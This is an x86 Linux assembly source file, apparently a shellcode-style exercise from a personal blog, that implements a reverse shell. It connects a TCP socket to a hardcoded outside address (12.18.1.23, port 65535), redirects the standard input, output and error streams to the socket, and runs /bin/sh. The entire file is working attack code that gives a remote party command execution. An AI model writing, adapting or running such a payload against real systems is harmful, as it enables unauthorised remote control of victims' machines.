; Filename: SocketClient.nasm
; Author:  citu_adrian@yahoo.com
; Website: 	itblog.adrian.citu.name

global _start
    
section .text

OpenSocket:
     
    ;syscall socketcall  
    xor eax,eax
    xor ebx, ebx
    mov al, 102     
	
   ; build the argument array on the stack
    push ebx ;protocol = 0
    push 1 ; type = SOCK_STREAM (1)
    push 2 ;domain = PF_INET (2)
    mov ecx, esp ;pointer to argument array
	
	mov bl, 01 ;1 = SYS_SOCKET = socket()
	int 0x80
	
	mov esi, eax
	
	call ConnectSocket
	ret
	
ConnectSocket:

    ; syscall socketcall
    xor eax, eax
    xor ebx, ebx    
    mov al, 102 
 
    ;build sockaddr struct on the stack
    ;push dword 0x100007f ; ADDRESS=127.0.0.1
    push dword 0x1701120c;ADDRESS =12.18.1.23
    push word 0xffff    ; PORT = 65535
    push word 2         ; AF_INET = 2
    mov ecx, esp        ; pointer to sockaddr struct
   	
   	mov bl, 3   ;3 = SYS_CONNECT = connect()
   	
   	push BYTE 16      ;sizeof(sockaddr struct) = 16 taken from the
   	                  ;systrace SocketClient Cpp version
   	                  
    push ecx          ;sockaddr struct pointer
    push esi          ;socket file descriptor
    mov ecx, esp      ;pointer to argument array
    int 0x80      
 
    call Dup2OutInErr
    
    ret 
    
    
Dup2OutInErr:
	
	xor eax, eax
    xor ebx, ebx 	
    
    ;syscall dup2
    mov al, 63   
    mov ebx, esi
    xor ecx, ecx ;duplicate stdin
    int 0x80 
    
	xor eax, eax
    xor ebx, ebx
    mov al, 63   ;syscall dup2
    mov ebx, esi
    inc ecx      ;duplicate stdout, ebx still holds the socket fd
    int 0x80  
    
    xor eax, eax
    xor ebx, ebx
    mov al, 63    ;syscall dup2
    mov ebx, esi
    inc ecx
    inc ecx      ;duplicate stdout, ebx still holds the socket fd
    int 0x80  
    
    call ExecuteBinSh
    ret

ExecuteBinSh:
    
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
	
    push eax        ;null bytes
    push 0x68732f2f ;//sh
    push 0x6e69622f ;/bin
    mov ebx, esp    ;load address of /bin/sh
     
    push eax ;set argument to 0x0
	mov ecx, esp ;save the pointer to argument envp
 
	push eax ;set argument to 0x0
	mov edx, esp ;save the pointer to argument ptr
    
    mov al, 11 ;syscall execve
    int 0x80
 
    ret

_start:
    call OpenSocket
    
    
     
